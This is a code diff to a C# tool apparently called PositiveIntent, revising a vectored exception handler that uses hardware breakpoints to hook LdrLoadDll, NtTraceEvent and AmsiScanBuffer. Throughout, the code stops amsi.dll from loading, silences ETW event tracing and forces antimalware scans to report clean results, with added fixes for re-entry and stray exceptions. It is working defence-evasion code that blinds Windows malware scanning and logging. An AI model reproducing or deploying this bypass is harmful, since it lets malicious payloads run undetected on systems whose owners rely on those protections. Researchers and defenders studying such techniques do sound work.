@@ -10,12 +10,16 @@ namespace PositiveIntent
         const uint EXCEPTION_CONTINUE_SEARCH = 0x0;
         const uint EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094;
         const uint EXCEPTION_SINGLE_STEP = 0x80000004;
-        const uint CONTEXT_DEBUG_REGISTERS = 0x00010010;
-        const uint CONTEXT_INTEGER = 0x00010002;
-        const uint CONTEXT_CONTROL = 0x00010001;
+        const uint CONTEXT_AMD64 = 0x00100000;
+        const uint CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 | 0x10; // 0x00100010
+        const uint CONTEXT_INTEGER = CONTEXT_AMD64 | 0x2;          // 0x00100002
+        const uint CONTEXT_CONTROL = CONTEXT_AMD64 | 0x1;          // 0x00100001
         const uint STATUS_DLL_NOT_FOUND = 0xc0000135;
 
         static bool breakpointsSet = false;
+
+        [ThreadStatic]
+        static bool _inDr0Handler;
 
         [StructLayout(LayoutKind.Sequential)]
         struct EXCEPTION_POINTERS
@@ -69,21 +73,11 @@ namespace PositiveIntent
         static uint VEHCallback(ref EXCEPTION_POINTERS exceptionInfo)
         {
             EXCEPTION_RECORD exRecord = Marshal.PtrToStructure<EXCEPTION_RECORD>(exceptionInfo.ExceptionRecord);
+            CONTEXT context = Marshal.PtrToStructure<CONTEXT>(exceptionInfo.ContextRecord);
+
             // Catch division by zero and set hardware breakpoint
             if (exRecord.ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO && !breakpointsSet)
             {
-                CONTEXT context = Marshal.PtrToStructure<CONTEXT>(exceptionInfo.ContextRecord);
-
-                // --- Advance RIP past the faulting idiv instruction ---
-                // Detect REX prefix (0x40–0x4F) for 64-bit operand size
-                byte firstByte = Marshal.ReadByte(new IntPtr((long)context.Rip));
-                bool hasRex = (firstByte & 0xF0) == 0x40;
-                context.Rip += hasRex ? 3UL : 2UL;  // REX F7 /7 = 3 bytes, F7 /7 = 2 bytes
-
-                // Leave quotient/remainder registers in a defined state
-                context.Rax = 0;
-                context.Rdx = 0;
-
                 // Get target function address
                 IntPtr ntdllBaseAddress = Generic.GetLoadedModuleAddress("ntdll.dll");
                 IntPtr amsiBaseAddress = Generic.GetLoadedModuleAddress("amsi.dll");
@@ -113,39 +107,49 @@ namespace PositiveIntent
 
                 breakpointsSet = true;
 
-                // Old flow: Let the exception propagate to managed handler (will become DivideByZeroException) - this triggered WerFault to spawn
-                // New flow: Handle the exception entirely in the VEH - skip the managed handler and return to the instruction after the idiv, with HWBPs set
-                //return EXCEPTION_CONTINUE_SEARCH;
-                return EXCEPTION_CONTINUE_EXECUTION;
+                return EXCEPTION_CONTINUE_SEARCH;
             }
 
             // Handle hardware breakpoint hits
             if (exRecord.ExceptionCode == EXCEPTION_SINGLE_STEP && breakpointsSet)
             {
-                CONTEXT context = Marshal.PtrToStructure<CONTEXT>(exceptionInfo.ContextRecord);
-
-                if ((context.Dr6 & 0x1) != 0)
+                if ((context.Dr6 & 0x1) != 0) // Dr0: LdrLoadDll
                 {
-                    var unicodeStringPtr = new IntPtr((long)context.R8);
-                    if (unicodeStringPtr != IntPtr.Zero)
+                    // Guard against re-entry: Marshal/CLR calls inside this block can themselves
+                    // invoke NtTraceEvent, which re-fires Dr1 and recursively enters the VEH.
+                    // The string-comparison path is the only managed-heavy section; if we're
+                    // already inside it, skip the check and let LdrLoadDll run normally.
+                    if (!_inDr0Handler)
                     {
-                        var us = Marshal.PtrToStructure<UNICODE_STRING>(unicodeStringPtr);
-                        if (us.Buffer != IntPtr.Zero && us.Length > 0)
+                        _inDr0Handler = true;
+                        try
                         {
-                            string dllName = Marshal.PtrToStringUni(us.Buffer, us.Length / sizeof(char));
-                            if (dllName.EndsWith("amsi.dll", StringComparison.OrdinalIgnoreCase))
+                            var unicodeStringPtr = new IntPtr((long)context.R8);
+                            if (unicodeStringPtr != IntPtr.Zero)
                             {
-                                // Spoof return: skip the load entirely
-                                ulong returnAddress = (ulong)Marshal.ReadInt64(new IntPtr((long)context.Rsp));
-                                context.Rip = returnAddress;
-                                context.Rsp += 8;
-                                context.Rax = STATUS_DLL_NOT_FOUND;
+                                var us = Marshal.PtrToStructure<UNICODE_STRING>(unicodeStringPtr);
+                                if (us.Buffer != IntPtr.Zero && us.Length > 0)
+                                {
+                                    string dllName = Marshal.PtrToStringUni(us.Buffer, us.Length / sizeof(char));
+                                    if (dllName.EndsWith("amsi.dll", StringComparison.OrdinalIgnoreCase))
+                                    {
+                                        // Spoof return: skip the load entirely
+                                        ulong returnAddress = (ulong)Marshal.ReadInt64(new IntPtr((long)context.Rsp));
+                                        context.Rip = returnAddress;
+                                        context.Rsp += 8;
+                                        context.Rax = STATUS_DLL_NOT_FOUND;
+                                    }
+                                }
                             }
+                        }
+                        finally
+                        {
+                            _inDr0Handler = false;
                         }
                     }
                 }
 
-                if ((context.Dr6 & 0x2) != 0)
+                else if ((context.Dr6 & 0x2) != 0) // Dr1: NtTraceEvent
                 {
                     // Simulate a 'ret' instruction
                     ulong returnAddress = (ulong)Marshal.ReadInt64(new IntPtr((long)context.Rsp));
@@ -154,9 +158,9 @@ namespace PositiveIntent
                     context.Rax = 0x0; // ERROR_SUCCESS
                 }
 
-                if ((context.Dr6 & 0x4) != 0)
-                {                    
-                    // Read the AMSI_RESULT* pointer from the stack (6th argument)
+                else if ((context.Dr6 & 0x4) != 0) // Dr2: AmsiScanBuffer
+                {
+                    // Read the AMSI_RESULT* pointer from the stack (6th argument at rsp+0x30)
                     IntPtr resultPtr = Marshal.ReadIntPtr(new IntPtr((long)context.Rsp + 0x30));
                     if (resultPtr != IntPtr.Zero)
                     {
@@ -167,6 +171,13 @@ namespace PositiveIntent
                     context.Rip = returnAddress;
                     context.Rsp += 8;
                     context.Rax = 0x0; // S_OK
+                }
+
+                else
+                {
+                    // SINGLE_STEP not from one of our HWBPs (e.g. TF-based step from CLR internals).
+                    // Don't consume it — pass to the next handler.
+                    return EXCEPTION_CONTINUE_SEARCH;
                 }
 
                 // Clear Dr6 status register
@@ -183,6 +194,8 @@ namespace PositiveIntent
 
                 return EXCEPTION_CONTINUE_EXECUTION;
             }
+            // Exception not a SINGLE_STEP
+            // Don't consume it — pass to the next handler.
             return EXCEPTION_CONTINUE_SEARCH;
         }
 
